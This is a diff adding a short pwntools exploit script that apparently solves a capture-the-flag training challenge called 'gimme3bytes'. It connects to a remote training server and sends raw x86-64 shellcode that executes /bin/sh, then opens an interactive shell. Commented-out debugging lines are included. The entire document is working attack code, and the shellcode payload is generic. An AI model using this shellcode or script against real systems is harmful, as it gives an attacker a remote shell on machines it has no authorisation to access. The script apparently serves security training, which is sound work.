@@ -1,0 +1,12 @@
+from pwn import *
+
+#c = process("./gimme3bytes")
+
+c = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
+
+#gdb.attach(c, """
+#b 0x00000000004011f1""")
+
+#input("WAIT")
+c.sendline(b"\x90\x0F\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xC0\x48\x83\xC0\x3B\x48\x31\xF6\x48\x31\xD2\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x0F\x05")
+c.interactive()
